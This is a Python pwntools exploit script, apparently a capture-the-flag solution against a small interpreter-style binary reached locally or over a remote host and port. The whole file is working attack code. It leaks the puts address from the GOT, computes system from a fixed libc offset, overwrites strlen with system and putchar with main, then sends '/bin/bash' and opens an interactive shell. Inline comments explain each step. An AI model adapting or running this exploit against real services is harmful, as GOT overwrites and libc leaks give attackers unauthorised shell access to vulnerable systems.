#!/usr/bin/env python

from pwn import *
import struct
import time

if len(sys.argv) == 3:
    r = remote(sys.argv[1], int(sys.argv[2]))
else:
    r = process(sys.argv[1])

r.recvuntil("Enter your code:")

code = ":)"       # exec puts once to resolve it
code += ":<"*32   # move to fu variable in .bss
code += ":."      # overwrite lowest byte to point to puts in got
code += ":::>"*4  # dump puts address
code += ":.:>"*4  # overwrite strlen() next to puts with system
code += ":>"*8    # move to putchar in got
code += ":.:>"*4  # overwrite putchar with main 
code += "::"      # execute putchar
log.success("code built, len is: %d" % len(code))
r.send(code)
r.send("\n")

r.send("\x1c") # this overwrites the lowest byte of the fu variable
r.recvuntil("Not implemented yet!\n")

puts_addr = u32(r.recvn(4)) # get puts addr
log.success("puts == 0x%x" % puts_addr)

system = puts_addr - 0x24f00
log.success("system == 0x%x" % system)

r.send(p32(system)) # overwrite strlen with system
r.send(p32(0x080486de)) # overwrite putchar with main

# main gets called again, buffer gets read again.
# then strlen is called (which is now system) with
# the buffer that has been read from stdin
r.sendline("/bin/bash")
r.interactive()
